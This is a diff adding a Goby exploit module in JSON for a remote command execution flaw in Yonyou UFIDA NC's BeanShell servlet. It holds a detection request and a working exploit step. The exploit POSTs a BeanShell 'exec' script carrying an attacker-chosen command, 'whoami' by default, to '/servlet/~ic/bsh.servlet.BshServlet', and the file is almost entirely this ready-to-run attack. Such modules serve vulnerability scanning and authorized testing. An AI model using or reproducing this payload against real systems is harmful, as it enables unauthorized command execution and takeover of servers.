@@ -1,0 +1,83 @@
+{
+      "Name": "Yonyou-UFIDA-NC-bsh.servlet.BshServlet-rce",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "app=\"Yonyou-UFIDA-NC\"",
+      "Description": "用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限",
+      "Product": "",
+      "Homepage": "https://github.com/adminwaf/goby_exp/",
+      "Author": "https://github.com/adminwaf/goby_exp/",
+      "Impact": "",
+      "Recommandation": "",
+      "References": [
+            "https://github.com/adminwaf/goby_exp/"
+      ],
+      "HasEXp":true,
+      "ExpParams": [
+       {
+        "name": "查看",
+        "type": "input",
+        "value": "whoami",
+        "show": ""
+        }
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "BeanShell",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+                "Exploitsteps":[
+                  "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+                        "follow_redirect": false,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
+                              "Content-Length": "42",
+                              "Content-Type": "application/x-www-form-urlencoded",
+                              "Accept-Encoding": "gzip"
+                        },
+                        "data_type": "text",
+                        "data": "bsh.script=exec%28%22whoami%22%29%0D%0A"
+                  },
+                "SetVariable": [
+                  "output|lastbody"
+            ]
+        }
+      ],
+      "PostTime": "2021-06-03 23:06:11",
+      "GobyVersion": "1.8.268"
+}
